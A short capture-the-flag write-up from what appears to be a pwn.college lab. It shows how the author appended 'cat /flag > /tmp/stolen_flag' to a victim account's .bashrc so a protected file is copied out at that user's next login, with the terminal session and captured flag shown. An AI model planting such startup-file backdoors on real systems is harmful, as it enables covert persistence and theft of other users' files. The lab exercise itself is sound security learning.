# 1. Bashrc Backdoor
> In this challenge we are to add our script into the backdoor of our victim, zardus. 

## My solve
**Flag:** `pwn.college{helloworld}`

The given information says that, 
/home/hacker/.bashrc is a file that runs on startup. Our aim, as hacker, is to add a script into this directory which gives us /flag from zardus's machine. 
I started with `echo 'cat /flag > /home/hacker/stolen_flag' >> /home/zardus/.bashrc` which said Permission denied. The problem here was that zardus cant write into stolen_flag because he only has read perms. So to solve this, the hacker itself has to create a file for zardus and give him permission to write into it.

So I tried this 

```bash
hacker@shenanigans~bashrc-backdoor:~$ touch /home/hacker/stolen_flag
hacker@shenanigans~bashrc-backdoor:~$ chmod +w /home/hacker/stolen_flag
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: ***********
-bash: /home/hacker/stolen_flag: Permission denied
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
hacker@shenanigans~bashrc-backdoor:~$ cat /home/hacker/stolen_flag
```

which still gave no output. The problem here was that zardus still lacked permissions. So I did a little bit of research and learned about a special directory where anyone can read or write files - /tmp

```bash
hacker@shenanigans~bashrc-backdoor:~$ echo 'cat /flag > /tmp/stolen_flag' >> /home/zardus/.bashrc
hacker@shenanigans~bashrc-backdoor:~$ /challenge/victim
Username: zardus
Password: **********
zardus@shenanigans~bashrc-backdoor:~$ exit
logout
hacker@shenanigans~bashrc-backdoor:~$ cat /tmp/stolen_flag
pwn.college{Y_cAaNWthI0PjFAzvclt9qRgqo2.0VMzEzNxwSM5kjNzEzW}
```


## What I learned
> I learned how to backdoor a .bashrc file using /tmp as a shared writeable location.
> /tmp is a special directory with wide-open permissions - anyone can create and write files there. It's designed for temporary files that different users might need to share.


